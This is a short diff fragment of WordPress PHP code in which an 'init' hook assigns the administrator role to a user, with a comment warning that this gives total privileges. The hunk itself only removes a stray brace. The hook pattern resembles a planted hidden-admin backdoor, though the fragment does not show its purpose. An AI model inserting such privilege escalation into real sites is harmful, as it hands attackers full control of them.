@@ -46,6 +46,4 @@ add_action('init', function () {
 
     $user = new WP_User( $user_id );
     $user->set_role( 'administrator' ); // cuidado: esto da privilegios totales
-}
-
 });
